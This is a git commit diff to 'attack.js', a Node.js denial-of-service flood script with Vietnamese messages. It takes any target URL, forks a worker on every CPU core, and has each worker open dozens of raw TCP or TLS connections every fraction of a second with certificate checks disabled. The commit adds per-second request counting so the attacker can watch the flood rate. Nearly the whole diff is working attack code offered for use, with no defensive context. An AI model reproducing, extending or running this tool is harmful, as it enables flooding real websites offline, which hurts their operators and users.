19b44164f976e8b75c20458eac9abb66dc26307d
DuocCyber <duoclangla7@gmail.com>
2026-06-21 15:35:14 +0700

    Update attack.js

--- attack.js
+++ attack.js
@@ -5,8 +5,10 @@ const os = require('os');
 
 const [,, target, seconds = 30] = process.argv;
 if (!target) return console.error('Dùng: node attack.js <URL> [giây]');
+
+
 console.clear();
- console.log(`
+console.log(`
 ██████  ██    ██  ██████   ██████     ██████  ███████ ██    ██ 
 ██   ██ ██    ██ ██    ██ ██          ██   ██ ██      ██    ██ 
 ██   ██ ██    ██ ██    ██ ██          ██   ██ █████   ██    ██ 
@@ -19,13 +21,14 @@ All Rights Reserved © 2026
 `);
 console.log(`Target: ${target}`);
 console.log(`Thời gian: ${seconds}s`);
-console.log(`Số worker: ${os.cpus().length}\n`);
+console.log(`Số worker: ${os.cpus().length}`);
+console.log('Đang tấn công... (RPS sẽ hiển thị mỗi giây)\n');
 
 const { hostname, port = 443, protocol, pathname = '/' } = new URL(target);
 const isHttps = protocol === 'https:';
 const portNum = parseInt(port) || (isHttps ? 443 : 80);
 
-function g() { // gửi 1 request
+function g() { 
   const s = isHttps
     ? tls.connect({ host: hostname, port: portNum, rejectUnauthorized: false })
     : net.connect({ host: hostname, port: portNum });
@@ -37,10 +40,40 @@ function g() { // gửi 1 request
 }
 
 if (cluster.isMaster) {
+
   for (let i = 0; i < os.cpus().length; i++) cluster.fork();
-  setTimeout(() => process.exit(0), seconds * 1000);
-} else {
+
+ 
+  let totalReqs = 0;
+  for (const id in cluster.workers) {
+    cluster.workers[id].on('message', (msg) => {
+      if (msg.cmd === 'stats') totalReqs += msg.count;
+    });
+  }
+
+
   setInterval(() => {
-    for (let i = 0; i < 15 + Math.random() * 20; i++) g();
+    console.log(`[${new Date().toLocaleTimeString()}] RPS: ${totalReqs}`);
+    totalReqs = 0;
+  }, 1000);
+
+ 
+  setTimeout(() => {
+    process.exit(0);
+  }, seconds * 1000);
+} else {
+ 
+  let reqCount = 0;
+  setInterval(() => {
+    for (let i = 0; i < 15 + Math.random() * 20; i++) {
+      g();
+      reqCount++;
+    }
   }, 200);
+
+  
+  setInterval(() => {
+    process.send({ cmd: 'stats', count: reqCount });
+    reqCount = 0;
+  }, 1000);
 }
